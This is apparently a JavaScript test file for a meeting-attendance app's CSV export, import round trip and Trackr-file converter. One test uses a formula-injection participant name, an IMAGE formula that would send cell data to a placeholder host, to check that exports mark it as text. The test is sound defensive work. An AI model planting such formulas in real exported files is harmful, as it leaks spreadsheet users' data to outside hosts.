/**
 * Reading a file this app did not write as a JSON backup.
 *
 * The CSV is the awkward one: it is the only export a person opens in a spreadsheet, and the only
 * one that comes back in again. So the row shape is a contract between the dashboard and this
 * module, and what these pin down is that the contract survives a round trip, including the names
 * a spreadsheet would rather run than read.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { csvRow, parseCSV, fromOwnCSV, configureLocaleLabels, getImportSource } from '../src/lib/importers.js';

const catalogue = (code) =>
  JSON.parse(readFileSync(new URL(`../_locales/${code}/messages.json`, import.meta.url), 'utf8'));

/** The real message catalogues, the same way the pages hand them over at startup. */
const tables = {};
for (const code of ['en', 'pl']) {
  const messages = catalogue(code);
  tables[code] = Object.fromEntries(Object.entries(messages).map(([k, v]) => [k, v.message]));
}
configureLocaleLabels(tables);

const L = (key, code = 'en') => tables[code][key];

/** A file with the columns fromOwnCSV needs, written the way downloadCSV writes one. */
function file(rows, code = 'en') {
  const header = [L('colDate', code), L('colMeeting', code), L('csvMeetingCode', code),
    L('colParticipant', code), L('csvEmail', code), L('csvSessionList', code), L('csvId', code)];
  return [header, ...rows].map(csvRow).join('\r\n');
}
const row = (name, extra = {}) => ['2026-08-14', extra.title || 'Standup', 'abc-defg-hij',
  name, extra.email || '', JSON.stringify(['09:00–10:00']), 'abc-defg-hij-1000'];

/* ---------------------------- the format itself ---------------------------- */

test('a cell keeps what was in it, commas and quotes included', () => {
  const text = csvRow(['Kowalska, Anna', 'She said "hello"', '']);
  assert.equal(text, '"Kowalska, Anna","She said ""hello""",""');
  assert.deepEqual(parseCSV(text), [['Kowalska, Anna', 'She said "hello"', '']]);
});

test('a quoted cell may hold a line break', () => {
  assert.deepEqual(parseCSV('"a\r\nb",c\r\nd,e'), [['a\r\nb', 'c'], ['d', 'e']]);
});

/* ---------------------------- names a spreadsheet would run ---------------------------- */

test('a name that would read as a formula is written as text and imported back whole', () => {
  const hostile = '=IMAGE("http://example.invalid/"&A1)';
  const text = file([row(hostile)]);

  assert.ok(text.includes(`"'${hostile.replace(/"/g, '""')}"`),
    'the spreadsheet is told to read the name, not to run it');

  const { meetings } = fromOwnCSV(text);
  assert.deepEqual(Object.keys(meetings[0].attendance), [hostile],
    'and the file still names the person it was written from');
});

test('a name that merely starts with an apostrophe comes back as itself', () => {
  const quoted = "'Anna";
  const { meetings } = fromOwnCSV(file([row(quoted)]));
  assert.deepEqual(Object.keys(meetings[0].attendance), [quoted]);
});

/* ---------------------------- what the round trip carries ---------------------------- */

test('a meeting keeps its id, so importing a file you already have adds nothing', () => {
  const { meetings } = fromOwnCSV(file([row('Anna Kowalska', { email: 'anna@example.com' })]));
  const [m] = meetings;

  assert.equal(m.id, 'abc-defg-hij-1000');
  assert.equal(m.meetingCode, 'abc-defg-hij');
  assert.equal(m.meetingTitle, 'Standup');
  assert.equal(m.attendance['Anna Kowalska'].email, 'anna@example.com');
  assert.equal(m.attendance['Anna Kowalska'].totalSeconds, 3600, 'an hour, read off the presence ranges');
});

test('a file exported in the other language reads the same', () => {
  const { meetings } = fromOwnCSV(file([row('Anna Kowalska')], 'pl'));
  assert.deepEqual(Object.keys(meetings[0].attendance), ['Anna Kowalska']);
});

test('a file that is not one of ours is refused rather than guessed at', () => {
  assert.throws(() => fromOwnCSV('name,age\r\nAnna,30'), /no participant header/);
  assert.throws(() => fromOwnCSV(''), /empty file/);
});

/* ---------------------------- Trackr (newbigtools.com) ----------------------------
 * Its CSV holds clock times only; the meeting's day and code live in the file name, and a row
 * is one join and one leave — the person is read as present for the whole stretch between.
 */

const trackr = getImportSource('trackr');
const TRACKR_NAME = 'Meet---nnp-xrmp-aop-2026-08-16 (1).csv';
const trackrFile = (rows) => ['"Name","Joined at","Left at","Time in call","Status"', ...rows].join('\r\n');
/** A wall clock on the file's day, in this machine's timezone — the way the importer reads one. */
const clock = (h, m, s = 0) => new Date(2026, 7, 16, h, m, s).getTime();

test('a Trackr export becomes one meeting, dated and coded from its file name', () => {
  const { meetings, skipped } = trackr.convert(trackrFile([
    '"BARBARA KAMIŃSKA","10:00 AM","06:00 PM","08:00:46","Left"',
    '"Krzysztof Sączawa","09:59 AM","06:01 PM","08:01:40","Left"',
    '"Krzysztof Sączawa (prezentacja)","10:06 AM","10:06 AM","00:00:02","Left"'
  ]), TRACKR_NAME);

  assert.equal(skipped, 0);
  assert.equal(meetings.length, 1);
  const [m] = meetings;
  assert.equal(m.meetingCode, 'nnp-xrmp-aop');
  assert.equal(m.url, 'https://meet.google.com/nnp-xrmp-aop');
  assert.equal(m.id, `nnp-xrmp-aop-${clock(9, 59)}`, 'the id is stable, so importing the file twice adds nothing');
  assert.equal(Date.parse(m.date), clock(9, 59));
  assert.equal(Date.parse(m.endedAt), clock(18, 0, 46), 'the meeting ends when its last leave does');

  assert.equal(m.attendance['BARBARA KAMIŃSKA'].totalSeconds, 8 * 3600 + 46,
    'the second-precise "Time in call" pins the leave, not the rounded clocks');
  assert.equal(m.attendance['Krzysztof Sączawa (prezentacja)'].totalSeconds, 2,
    'a share tile that lived two seconds is not rounded down to none');
});

test('a Trackr row with no leave is someone still in the call, holding the meeting open', () => {
  const { meetings } = trackr.convert(trackrFile([
    '"Anna Kowalska","10:00 AM","","01:23:45","In call"'
  ]), TRACKR_NAME);
  assert.equal(meetings[0].attendance['Anna Kowalska'].present, true);
  assert.equal(meetings[0].endedAt, null);
});

test('a Trackr leave that reads before its join happened past midnight', () => {
  const { meetings } = trackr.convert(trackrFile([
    '"Anna Kowalska","11:50 PM","00:10 AM","",""'
  ]), TRACKR_NAME);
  assert.equal(meetings[0].attendance['Anna Kowalska'].totalSeconds, 20 * 60);
});

test('two Trackr rows with one name are one participant with two sessions', () => {
  const { meetings } = trackr.convert(trackrFile([
    '"Anna Kowalska","09:00 AM","09:30 AM","00:30:00","Left"',
    '"Anna Kowalska","10:00 AM","10:15 AM","00:15:00","Left"'
  ]), TRACKR_NAME);
  const anna = meetings[0].attendance['Anna Kowalska'];
  assert.equal(anna.sessions.length, 2);
  assert.equal(anna.totalSeconds, 45 * 60);
});

test('a file that is not Trackr\'s, or a name the day was lost from, is refused', () => {
  assert.throws(() => trackr.convert('name,age\r\nAnna,30', TRACKR_NAME), /header/);
  assert.throws(() => trackr.convert(trackrFile(['"Anna","10:00 AM","11:00 AM","01:00:00","Left"']), 'attendance.csv'),
    /file name/, 'the clocks anchor to nothing without the day from the file name');
});
